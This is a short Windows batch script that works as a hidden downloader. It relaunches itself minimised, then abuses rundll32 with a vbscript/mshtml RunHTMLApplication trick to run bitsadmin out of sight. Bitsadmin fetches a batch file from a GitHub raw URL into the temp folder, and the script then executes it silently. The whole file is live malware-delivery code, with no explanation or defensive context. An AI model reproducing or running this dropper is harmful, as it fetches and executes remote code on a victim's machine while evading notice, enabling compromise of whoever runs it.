@echo off
start /min "" %0 %*
rundll32 vbscript:"\\..\\mshtml\\..\\PWN\\..\\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("%comspec% /c bitsadmin /transfer ""D"" https://raw.githubusercontent.com/eventos-dev/test/main/don.bat %temp%\p.bat"),0)
rundll32 vbscript:"\\..\\mshtml\\..\\PWN\\..\\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("%temp%\p.bat"),0)
exit
